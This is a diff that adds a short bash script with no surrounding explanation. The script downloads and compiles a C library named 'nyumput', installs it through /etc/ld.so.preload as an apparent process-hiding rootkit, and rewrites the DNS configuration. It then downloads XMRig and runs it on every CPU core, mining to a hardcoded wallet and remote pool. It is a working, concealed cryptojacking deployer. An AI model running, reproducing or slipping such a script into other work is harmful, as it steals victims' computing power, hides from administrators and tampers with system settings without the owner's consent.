@@ -1,0 +1,14 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+tar xf xmrig-6.24.0-linux-static-x64.tar.gz
+cd xmrig-6.24.0
+./xmrig --donate-level 1 -u VENeRa1Z4TPhJ3vLqwpM2LD2KdBwrpjghYgprfhxgpWyjSjgQakfpkSCrJGU9TCuZQ6PceZQLGe1v1JGrLcMzK8ieHVfAChCQAw3F.$(shuf -n 1 -i 1-99999)-KIR -o mine.veneralabs.org:9099 -p x -t $(nproc --all)
